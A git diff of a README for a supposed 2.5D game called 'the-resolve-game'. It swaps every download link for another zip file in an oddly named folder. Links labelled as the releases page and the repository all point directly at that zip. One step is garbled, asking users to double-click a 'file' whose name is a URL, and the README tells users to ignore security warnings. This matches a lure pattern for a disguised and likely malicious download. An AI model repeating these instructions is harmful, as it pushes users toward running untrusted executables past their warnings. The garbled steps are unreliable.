@@ -1,6 +1,6 @@
 # 🎮 the-resolve-game - Enjoy Your 2.5D Adventure
 
-[![Download the-resolve-game](https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip)](https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip)
+[![Download the-resolve-game](https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip)](https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **the-resolve-game**! This guide helps you download and run the game 
 
 To start playing, you'll need to visit the releases page. Click the link below to get your copy of the game:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip)
+[Visit the Releases Page to Download](https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip)
 
 Once on the page:
 1. Look for the latest release at the top.
@@ -25,7 +25,7 @@ Once the download completes:
 1. Navigate to your Downloads folder or the location where the file was saved.
 2. If the file is a `.zip`, you'll first need to extract it. Right-click on the file and select "Extract All" or use your favorite extraction tool.
 3. Open the extracted folder.
-4. If you see a file named `https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip`, double-click it to start the installation.
+4. If you see a file named `https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip`, double-click it to start the installation.
 
 Follow the prompts to install the game on your computer. If you see any warnings about running the program, you can safely ignore them as long as you downloaded it from our official releases page.
 
@@ -66,7 +66,7 @@ If you run into any issues, try the following solutions:
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/mrsevenn07/the-resolve-game/main/spondylium/the-resolve-game.zip)
+- [Visit the Releases Page to Download](https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip)
+- [GitHub Repository](https://github.com/mrsevenn07/the-resolve-game/raw/refs/heads/main/spondylium/resolve-the-game-2.4.zip)
 
 We appreciate your support and hope you enjoy playing **the-resolve-game**! If you have any feedback or questions, please feel free to reach out through the GitHub Repository. Happy gaming!
